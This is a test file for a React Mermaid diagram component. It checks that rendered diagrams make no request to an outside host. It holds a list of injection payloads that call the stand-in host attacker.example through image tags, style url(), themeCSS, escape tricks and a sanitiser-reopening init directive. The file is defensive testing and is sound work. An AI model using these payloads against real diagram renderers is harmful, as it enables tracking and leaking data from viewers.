import React from 'react';
import { describe, it, expect, afterEach, beforeAll, afterAll, vi } from 'vitest';
import { render, cleanup, waitFor } from '@testing-library/react';
import { Theme } from '@radix-ui/themes';
import { MermaidDiagram } from '../mermaid-diagram';

// The real mermaid, at the version the lock pins, drawing into jsdom. jsdom fetches nothing, so every outside
// URL the browser would load is recorded where it is set: `Image.src`, a URL attribute on a connected element,
// an inline style, or the text of a <style> element.
const OUTSIDE = 'attacker.example';
const A = `https://${OUTSIDE}`;

const requests: string[] = [];
const record = (what: string, value: unknown) => {
  if (String(value ?? '').includes(OUTSIDE)) requests.push(`${what}: ${String(value).slice(0, 100)}`);
};
const FETCHING_ATTRIBUTES = new Set(['src', 'srcset', 'href', 'xlink:href', 'poster', 'background', 'data', 'style']);
const isLink = (el: Element) => el.localName === 'a';

function recordElement(el: Element) {
  for (const attr of Array.from(el.attributes)) {
    if (FETCHING_ATTRIBUTES.has(attr.name.toLowerCase()) && !isLink(el)) record(`${el.localName}[${attr.name}]`, attr.value);
  }
  if (el.localName === 'style') record('style', el.textContent);
}

let observer: MutationObserver;
const saved: Array<() => void> = [];

beforeAll(() => {
  const proto = window.SVGElement.prototype as unknown as Record<string, unknown>;
  const box = () => ({ x: 0, y: 0, width: 40, height: 16 });
  const keep = (target: Record<string, unknown>, key: string) => {
    const before = Object.getOwnPropertyDescriptor(target, key);
    saved.push(() => (before ? Object.defineProperty(target, key, before) : delete target[key]));
  };
  keep(proto, 'getBBox');
  keep(proto, 'getComputedTextLength');
  proto.getBBox = box;
  proto.getComputedTextLength = () => 40;
  // mermaid sizes a label's <img> once it has loaded; jsdom never loads one.
  const img = window.HTMLImageElement.prototype as unknown as Record<string, unknown>;
  keep(img, 'complete');
  Object.defineProperty(img, 'complete', { configurable: true, get: () => true });

  const OriginalImage = window.Image;
  class RecordingImage {
    naturalWidth = 10;
    naturalHeight = 10;
    set src(value: string) {
      record('Image.src', value);
    }
    decode() {
      return Promise.resolve();
    }
  }
  window.Image = RecordingImage as unknown as typeof Image;
  saved.push(() => {
    window.Image = OriginalImage;
  });

  const setAttribute = window.Element.prototype.setAttribute;
  window.Element.prototype.setAttribute = function (this: Element, name: string, value: string) {
    if (this.isConnected && FETCHING_ATTRIBUTES.has(name.toLowerCase()) && !isLink(this)) record(`${this.localName}[${name}]`, value);
    return setAttribute.call(this, name, value);
  };
  const setAttributeNS = window.Element.prototype.setAttributeNS;
  window.Element.prototype.setAttributeNS = function (this: Element, ns: string | null, name: string, value: string) {
    if (this.isConnected && FETCHING_ATTRIBUTES.has(name.toLowerCase()) && !isLink(this)) record(`${this.localName}[${name}]`, value);
    return setAttributeNS.call(this, ns, name, value);
  };
  saved.push(() => {
    window.Element.prototype.setAttribute = setAttribute;
    window.Element.prototype.setAttributeNS = setAttributeNS;
  });

  observer = new MutationObserver((mutations) => {
    for (const m of mutations) {
      if (m.type === 'attributes' && m.target instanceof Element) recordElement(m.target);
      for (const node of Array.from(m.addedNodes)) {
        if (node instanceof Element) [node, ...Array.from(node.querySelectorAll('*'))].forEach(recordElement);
        else if (node.parentElement?.localName === 'style') record('style', node.textContent);
      }
    }
  });
  observer.observe(document.body, { subtree: true, childList: true, attributes: true, characterData: true });
  vi.stubGlobal('matchMedia', () => ({ matches: false, addEventListener: () => {}, removeEventListener: () => {} }));

  // `details` reads an actor's properties from any element on the page by id.
  const details = document.createElement('p');
  details.id = 'pageDetails';
  details.textContent = `{"properties":{"icon":"${A}/details.png?d=CNRY_R"}}`;
  document.body.appendChild(details);
  saved.push(() => details.remove());
});

afterAll(() => {
  observer.disconnect();
  saved.reverse().forEach((restore) => restore());
  vi.unstubAllGlobals();
});

afterEach(() => {
  cleanup();
  requests.length = 0;
});

/** Every attribute and CSS rule in the shown drawing that names the outside host; text that merely mentions it is inert. */
function liveOutsideUrls(root: Element): string[] {
  const hits: string[] = [];
  for (const el of Array.from(root.querySelectorAll('*'))) {
    for (const attr of Array.from(el.attributes)) {
      if (attr.value.includes(OUTSIDE)) hits.push(`${el.localName}[${attr.name}]`);
    }
    if (el.localName === 'style' && (el.textContent ?? '').includes(OUTSIDE)) hits.push('style');
  }
  return hits;
}

/** Renders the diagram and waits for the drawing (or the error banner) to settle. */
async function draw(chart: string) {
  const view = render(React.createElement(Theme, null, React.createElement(MermaidDiagram, { chart })));
  await waitFor(
    () => {
      const drawn = view.container.querySelector('svg');
      const failed = /diagramRenderFailed|Could not render diagram/.test(view.container.textContent ?? '');
      expect(Boolean(drawn) || failed).toBe(true);
    },
    { timeout: 8000 },
  );
  // Label images and live attribute writes land a tick after the drawing.
  await new Promise((resolve) => setTimeout(resolve, 20));
  return view;
}

const PAYLOADS: Array<[string, string]> = [
  ['shape img, quoted', `flowchart TD\n  A@{ img: "${A}/i.png?d=CNRY_R", label: "Bands" }\n  A --> B`],
  ['shape img, unquoted', `flowchart TD\n  A@{ img: ${A}/u.png?d=CNRY_R, label: "Bands" }\n  A --> B`],
  ['shape img, YAML escape', 'flowchart TD\n  A@{ img: "\\x68ttps://attacker.example/e.png?d=CNRY_R", label: "Bands" }\n  A --> B'],
  ['sequence properties icon', `sequenceDiagram\n  participant A\n  participant B\n  properties A: {"icon": "${A}/s.png?d=CNRY_R"}\n  A->>B: hi`],
  ['sequence properties icon, JSON escape', 'sequenceDiagram\n  participant A\n  participant B\n  properties A: {"icon": "\\u0068ttps://attacker.example/j.png?d=CNRY_R"}\n  A->>B: hi'],
  ['shape img, block YAML', `flowchart TD\n  A@{\n    shape: rect\n    img: ${A}/ml.png?d=CNRY_R\n  }\n  A --> B`],
  ['shape img, protocol-relative', 'flowchart TD\n  A@{ img: "//attacker.example/pr.png?d=CNRY_R" }\n  A --> B'],
  ['shape img, keyword in capitals', `flowchart TD\n  A@{ IMG: "${A}/caps.png?d=CNRY_R", img: "${A}/caps2.png?d=CNRY_R" }`],
  ['sequence details', 'sequenceDiagram\n  participant A\n  participant B\n  details A: pageDetails\n  A->>B: hi'],
  ['sequence properties, keyword in capitals', `sequenceDiagram\n  participant A\n  PROPERTIES A: {"icon": "${A}/S.png?d=CNRY_R"}\n  A->>A: hi`],
  ['label <img>', `flowchart TD\n  A["<img src='${A}/label.png?d=CNRY_R'>"] --> B`],
  ['label <img>, unquoted', `flowchart TD\n  A[<img src=${A}/label2.png?d=CNRY_R>] --> B`],
  ['label <img>, entity-spelled src', `flowchart TD\n  A["<img src=&quot;${A}/ent.png?d=CNRY_R&quot;>"] --> B`],
  ['shape label <img>', `flowchart TD\n  A@{ label: "<img src='${A}/metalabel.png?d=CNRY_R'>" }\n  A --> B`],
  ['shape label <img>, YAML escape', `flowchart TD\n  A@{ label: "\\x3Cimg src='${A}/metalabel2.png?d=CNRY_R'\\x3E" }\n  A --> B`],
  ['markdown-string label <img>', `flowchart TD\n  A["\`<img src='${A}/mdstr.png?d=CNRY_R'>\`"] --> B`],
  ['label <picture><source srcset>', `flowchart TD\n  A["<picture><source srcset='${A}/srcset.png?d=CNRY_R'><img src='data:image/gif;base64,R0lGODlhAQABAAAAACw='></picture>"] --> B`],
  ['label inline style url()', `flowchart TD\n  A["<span style='background-image:url(${A}/span.png?d=CNRY_R)'>x</span>"] --> B`],
  ['subgraph title <img>', `flowchart TD\n  subgraph S["<img src='${A}/sub.png?d=CNRY_R'>"]\n    A\n  end`],
  ['edge label <img>', `flowchart TD\n  A -- "<img src='${A}/edge.png?d=CNRY_R'>" --> B`],
  ['class label <img>', `classDiagram\n  class Animal["<img src='${A}/class.png?d=CNRY_R'>"]`],
  ['state label <img>', `stateDiagram-v2\n  s1: <img src='${A}/state.png?d=CNRY_R'>\n  [*] --> s1`],
  ['init themeCSS url()', `%%{init: {"themeCSS": ".nodeLabel { background-image: url(${A}/bg.png?d=CNRY_R); }"}}%%\nflowchart TD\n  A --> B`],
  ['frontmatter themeCSS url()', `---\nconfig:\n  themeCSS: ".nodeLabel { background-image: url(${A}/fm.png?d=CNRY_R); }"\n---\nflowchart TD\n  A --> B`],
  ['init re-opening label HTML', `%%{init: {"dompurifyConfig": {"ALLOWED_TAGS": ["img"], "ALLOWED_ATTR": ["src"]}}}%%\nflowchart TD\n  A["<img src='${A}/ovr.png?d=CNRY_R'>"] --> B`],
];

describe('MermaidDiagram — a drawing contacts no outside host', () => {
  it.each(PAYLOADS)('%s', async (_name, chart) => {
    const { container } = await draw(chart);
    expect(requests).toEqual([]);
    expect(liveOutsideUrls(container)).toEqual([]);
  }, 15000);

  it.each([
    ['click href', `flowchart TD\n  A --> B\n  click A href "${A}/click?d=CNRY_R"`],
    ['sequence links', `sequenceDiagram\n  participant A\n  links A: {"Dash": "${A}/links?d=CNRY_R"}\n  A->>A: hi`],
    ['sequence link', `sequenceDiagram\n  participant A\n  link A: Dash @ ${A}/link?d=CNRY_R\n  A->>A: hi`],
  ])('leaves no outside link in the drawing it shows: %s', async (_name, chart) => {
    const { container } = await draw(chart);
    expect(liveOutsideUrls(container)).toEqual([]);
  }, 15000);
});

describe('MermaidDiagram — ordinary diagrams still draw', () => {
  it.each([
    ['labels with line breaks and emphasis', 'flowchart TD\n  A["First<br/>second"] --> B["<b>bold</b> and <i>it</i>"]\n  B --> C["`**md** string`"]', ['First', 'bold', 'md']],
    ['shape metadata', 'flowchart TD\n  A@{ shape: rounded, label: "Rounded" }\n  A e1@--> B\n  e1@{ animate: true }', ['Rounded']],
    ['multi-line shape metadata', 'flowchart TD\n  A@{\n    shape: diamond\n    label: "Decide"\n  }\n  A --> B', ['Decide']],
    ['sequence', 'sequenceDiagram\n  participant A as Alice\n  A->>B: hello <br/> there\n  Note right of B: a note', ['Alice', 'hello', 'a note']],
    ['class annotations', 'classDiagram\n  class Shape{\n    <<interface>>\n    +draw()\n  }', ['interface', 'draw']],
    ['theme directive', "%%{init: {'theme': 'forest'}}%%\nflowchart LR\n  A[Start] --> B[End]", ['Start', 'End']],
  ])('%s', async (_name, chart, texts) => {
    const { container } = await draw(chart);
    expect(container.querySelector('svg')).not.toBeNull();
    expect(container.querySelector('svg style')?.textContent ?? '').toContain('fill');
    for (const text of texts) expect(container.textContent).toContain(text);
  }, 15000);
});
